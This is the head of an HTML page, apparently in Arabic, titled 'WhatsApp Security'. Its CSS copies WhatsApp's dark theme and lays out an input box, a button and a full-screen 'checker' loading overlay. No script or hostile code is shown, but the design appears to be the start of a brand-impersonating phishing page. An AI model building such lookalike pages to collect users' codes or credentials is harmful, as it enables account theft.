<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Roboto, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; align-items: center; justify-content: center; direction: rtl; overflow: hidden; }
        .container { width: 100%; max-width: 400px; padding: 30px; text-align: center; }
        .card { background: #1d2a33; border-radius: 15px; padding: 20px; margin: 20px 0; border: 1px solid #2a3942; text-align: right; }
        .info-row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 10px; color: var(--wa-hint); }
        .info-row b { color: var(--wa-green); }
        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 15px; color: #fff; font-size: 16px; outline: none; margin: 15px 0; text-align: left; }
        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
